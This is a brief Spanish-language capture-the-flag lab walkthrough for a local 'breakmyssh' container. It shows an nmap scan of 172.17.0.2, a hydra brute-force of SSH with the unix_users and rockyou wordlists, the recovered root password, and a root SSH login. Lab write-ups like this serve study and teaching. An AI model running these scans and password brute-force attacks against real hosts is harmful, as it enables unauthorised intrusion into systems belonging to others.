
------------------------
DESPLIEGUE 

```
sudo bash auto_deploy.sh breakmyssh.tar
```



--------------------
PROCEDIMIENTO

Tenemos la IP: `172.17.0.2`.


-------------------------

RECONOCIMIENTO

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

Tenemos el puerto 22, SSH.

![[Pasted image 20240915033401.png]]


Como tenemos un puerto 22 vamos a usar hydra con el siguiente comando:

```
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
```

Y nos sale lo siguiente:

![[Pasted image 20240915035220.png]]

password : estrella
y es root pues ya pondríamos :

```
ssh root@172.17.0.2
```

![[Pasted image 20240915035448.png]]


Y ya estamos adentro !!
